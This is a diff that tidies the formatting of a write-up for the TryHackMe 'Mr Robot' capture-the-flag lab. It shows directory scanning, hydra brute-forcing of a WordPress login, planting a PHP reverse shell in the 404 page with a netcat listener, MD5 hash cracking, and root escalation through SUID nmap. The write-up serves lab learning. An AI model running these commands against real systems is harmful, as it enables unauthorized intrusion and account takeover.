@@ -4,10 +4,11 @@
 ### Link:  (https://tryhackme.com/room/mrrobot)
 
 
-Note use your own machine IP upon deploying the machine.
-'''
+Note: Use your own machine IP upon deploying the machine.
+
+```
 	export IP=10.10.108.126
-'''
+```
 
 Upon scanning the IP we have:
 
@@ -30,10 +31,9 @@ key-1-of-3.txt
 ```
 Upon further ennumeration we find Key1 and a dictonary file.
 
-'''
-1. Key 1: 073XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
-'''
-
+```
+	1. Key 1: 073XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
 
 ```(Directory scan)
 gobuster dir -u http://10.10.108.126/ -w /usr/share/wordlists/dirb/common.txt
@@ -79,10 +79,8 @@ gobuster dir -u http://10.10.108.126/ -w /usr/share/wordlists/dirb/common.txt
 
 ```
 
-Upon further ennumeration this turns out to be a wordpress site and we have access to a login page at  (http://10.10.108.126/wp-login/)
-
+Upon further ennumeration this turns out to be a wordpress site and we have access to a login page at  (http://$IP/wp-login/)
 Lets bruteforce this login page.
-
 
 ```(hydra)
 
@@ -95,7 +93,7 @@ Lets bruteforce this login page.
 	Password: ER28-0652
 
 ```
-	Lets login with the credentials now we can also use burpsuite to bruteforce or use wpscan.
+Lets login with the credentials now we can also use burpsuite to bruteforce or use wpscan.
 
 
 ```(wp scan)
@@ -188,8 +186,7 @@ Lets bruteforce this login page.
 
 ```	
 
-Next as we are able to login to the admin-panel we will modify the 404 error page to get a reverse shell
-
+As we are able to login to the admin-panel we will modify the 404 error page to get a reverse shell
 we user the webshell located in kali
 
 ```(webshell)
@@ -199,22 +196,18 @@ locate php-reverse-shell.php
 /usr/share/webshells/php/php-reverse-shell.php
 ```
 
-we modify the ip and port to our ip and port and then start listening on netcat for connections.
+We modify the Ip and port to our ip and port and then start listening on netcat for connections.
 
 ```(netcat server)
 	nc -nlvp 4000
 ```
 
-next we visit to any random page on http://$IP/random
-and our reverse shell is executed.
-
+Next we visit to any random page on http://$IP/random and our reverse shell is executed.
 
 Getting proper terminal from rawshell
 
 ```(proper shell using python)
-	
 	python -c 'import pty; pty.spawn("/bin/bash")'
-
 ```
 
 
@@ -224,33 +217,29 @@ we have a key file and a password file with hash. We can see the password but no
 so, lets crack the md5-hash using hashcat or john and rockyou.txt wordlist.
 
 ```(cracking hash)
-
 	echo "c3fcd3d76192e4007dfb496cca67e13b" > hash2.txt
 	hash-identifier c3fcd3d76192e4007dfb496cca67e13b
 	hashcat -m0 --force hash2.txt /usr/share/wordlists/rockyou.txt
-
 ```
 
 After this we get the password for the user robot and we can use su robot to gain root access and read key2-of-3.txt
 
 
-'''
+```
 	Key 2: 822XXXXXXXXXXXXXXXXXXXXXXXXX
-'''
+```
 
 Priviledge Esclation:
 
 Now lets look for files which have the setuid bit set for the user to get the flag on /root
 
 ```(setuid enum)
-
 	find / -perm -u=s -type f 2>/dev/null
-
 ```
 
- some of the existing binaries and utilities can be used to escalate privileges to root if they have the SUID permission. Known Linux executables that can allow privilege escalation are:
+Some of the existing binaries and utilities can be used to escalate privileges to root if they have the SUID permission. Known Linux executables that can allow privilege escalation are:
 
-  -  Nmap
+  - Nmap
   - Vim
   - find
   - Bash
@@ -259,19 +248,17 @@ Now lets look for files which have the setuid bit set for the user to get the fl
   - Nano
   - cp
 
-  Esclating priviledge :
+Esclating priviledge :
 
   ```(nmap interactive)
-	
 	nmap --interactive
 	nmap> !sh
-
   ```
 
   Bingo we have our root shell.
 
   Move to cd /root
 
-'''
+```
 	Key 3: 047XXXXXXXXXXXXXXXXXXXXXXX
-'''
+```
